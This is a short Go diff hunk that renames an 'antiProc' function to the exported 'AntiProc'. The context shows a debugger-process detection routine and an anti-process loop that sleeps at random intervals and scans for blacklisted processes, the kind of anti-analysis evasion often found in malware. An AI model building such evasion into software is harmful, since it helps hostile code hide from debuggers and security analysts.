@@ -58,7 +58,7 @@ func detectDebugProc() bool { //Process Detection
 //============================================================
 //                   Anti-Process
 //============================================================
-func antiProc() {
+func AntiProc() {
 	for {
 		time.Sleep(time.Duration(randInt(500, 1000)) * time.Millisecond)
 		//Scan for Blacklisted Proc
